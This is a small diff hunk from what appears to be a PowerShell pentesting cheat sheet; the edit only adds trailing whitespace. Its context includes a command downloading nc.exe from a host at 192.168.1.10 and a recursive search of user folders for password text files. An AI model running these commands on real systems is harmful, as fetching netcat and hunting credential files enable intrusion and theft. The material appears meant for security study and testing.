@@ -37,5 +37,5 @@ PS C:\> (New-Object System.Net.WebClient).DownloadFile("http://192.168.1.10/nc.e
 ```
 **Find all files with a particular name:**
 ```
-PS C:\> Get-ChildItem "C:\Users\" -recurse -include *passwords*.txt
+PS C:\> Get-ChildItem "C:\Users\" -recurse -include *passwords*.txt 
 ```
